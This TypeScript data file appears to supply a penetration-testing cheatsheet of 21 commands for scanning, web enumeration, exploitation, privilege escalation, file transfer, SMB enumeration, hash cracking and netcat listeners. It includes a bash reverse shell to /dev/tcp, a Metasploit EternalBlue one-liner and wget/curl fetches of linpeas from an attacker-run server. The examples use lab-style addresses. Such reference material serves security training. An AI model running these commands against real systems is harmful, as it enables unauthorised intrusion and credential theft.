import { CheatCommand } from '@/types';

export const cheatsheetCommands: CheatCommand[] = [
    // Network Scanning
    {
        id: '1',
        category: 'Network Scanning',
        command: 'nmap -sC -sV -oN scan.txt <IP>',
        description: 'Default script scan with version detection',
        example: 'nmap -sC -sV -oN scan.txt 10.10.10.1'
    },
    {
        id: '2',
        category: 'Network Scanning',
        command: 'nmap -p- --min-rate 10000 <IP>',
        description: 'Fast full port scan',
        example: 'nmap -p- --min-rate 10000 10.10.10.1'
    },
    {
        id: '3',
        category: 'Network Scanning',
        command: 'masscan -p1-65535 <IP> --rate=1000',
        description: 'Ultra-fast port scanner',
        example: 'masscan -p1-65535 10.10.10.1 --rate=1000'
    },

    // Web Enumeration
    {
        id: '4',
        category: 'Web Enumeration',
        command: 'gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt',
        description: 'Directory and file brute-forcing',
        example: 'gobuster dir -u http://10.10.10.1 -w /usr/share/wordlists/dirb/common.txt'
    },
    {
        id: '5',
        category: 'Web Enumeration',
        command: 'ffuf -u http://<IP>/FUZZ -w wordlist.txt',
        description: 'Fast web fuzzer',
        example: 'ffuf -u http://10.10.10.1/FUZZ -w /usr/share/wordlists/dirb/common.txt'
    },
    {
        id: '6',
        category: 'Web Enumeration',
        command: 'nikto -h http://<IP>',
        description: 'Web server vulnerability scanner',
        example: 'nikto -h http://10.10.10.1'
    },

    // Exploitation
    {
        id: '7',
        category: 'Exploitation',
        command: 'msfconsole -q -x "use <exploit>; set RHOSTS <IP>; run"',
        description: 'Quick Metasploit exploitation',
        example: 'msfconsole -q -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS 10.10.10.1; run"'
    },
    {
        id: '8',
        category: 'Exploitation',
        command: 'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
        description: 'Spawn interactive shell',
        example: 'python3 -c \'import pty; pty.spawn("/bin/bash")\''
    },
    {
        id: '9',
        category: 'Exploitation',
        command: 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1',
        description: 'Bash reverse shell',
        example: 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1'
    },

    // Privilege Escalation - Linux
    {
        id: '10',
        category: 'Privilege Escalation',
        command: 'sudo -l',
        description: 'List sudo privileges',
        example: 'sudo -l'
    },
    {
        id: '11',
        category: 'Privilege Escalation',
        command: 'find / -perm -4000 2>/dev/null',
        description: 'Find SUID binaries',
        example: 'find / -perm -4000 2>/dev/null'
    },
    {
        id: '12',
        category: 'Privilege Escalation',
        command: 'getcap -r / 2>/dev/null',
        description: 'Find files with capabilities',
        example: 'getcap -r / 2>/dev/null'
    },

    // File Transfer
    {
        id: '13',
        category: 'File Transfer',
        command: 'python3 -m http.server 8000',
        description: 'Start HTTP server for file transfer',
        example: 'python3 -m http.server 8000'
    },
    {
        id: '14',
        category: 'File Transfer',
        command: 'wget http://<IP>:<PORT>/file',
        description: 'Download file from remote server',
        example: 'wget http://10.10.14.1:8000/linpeas.sh'
    },
    {
        id: '15',
        category: 'File Transfer',
        command: 'curl http://<IP>:<PORT>/file -o file',
        description: 'Download file using curl',
        example: 'curl http://10.10.14.1:8000/linpeas.sh -o linpeas.sh'
    },

    // SMB Enumeration
    {
        id: '16',
        category: 'SMB Enumeration',
        command: 'smbclient -L //<IP>/ -N',
        description: 'List SMB shares anonymously',
        example: 'smbclient -L //10.10.10.1/ -N'
    },
    {
        id: '17',
        category: 'SMB Enumeration',
        command: 'enum4linux -a <IP>',
        description: 'Comprehensive SMB enumeration',
        example: 'enum4linux -a 10.10.10.1'
    },

    // Password Cracking
    {
        id: '18',
        category: 'Password Cracking',
        command: 'john --wordlist=rockyou.txt hash.txt',
        description: 'Crack password hashes with John',
        example: 'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt'
    },
    {
        id: '19',
        category: 'Password Cracking',
        command: 'hashcat -m 0 -a 0 hash.txt rockyou.txt',
        description: 'Crack MD5 hashes with hashcat',
        example: 'hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt'
    },

    // Listeners
    {
        id: '20',
        category: 'Listeners',
        command: 'nc -lvnp <PORT>',
        description: 'Start netcat listener',
        example: 'nc -lvnp 4444'
    },
    {
        id: '21',
        category: 'Listeners',
        command: 'rlwrap nc -lvnp <PORT>',
        description: 'Start netcat listener with readline wrapper',
        example: 'rlwrap nc -lvnp 4444'
    }
];
